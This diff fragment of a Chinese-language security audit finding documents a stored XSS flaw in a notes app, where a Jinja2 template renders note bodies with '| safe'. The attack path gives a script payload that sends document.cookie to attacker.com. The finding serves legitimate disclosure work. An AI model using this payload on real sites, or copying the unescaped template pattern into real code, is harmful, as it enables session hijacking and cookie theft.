@@ -67,6 +67,14 @@ body 参数无任何过滤或转义，通过 `create_note` 参数化插入数据
 
 `| safe` 过滤器标记内容为安全，跳过 Jinja2 自动转义。body 中的 HTML/JavaScript 原样输出到页面。
 
+### 漏洞代码
+
+- 完整路径：`src/templates/notes.html:18`
+
+```html
+<div class="body">{{ n.body | safe }}</div>
+```
+
 ### 攻击路径
 
 1. 匿名 POST `/api/notes` 创建备忘录，body 设为 `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`
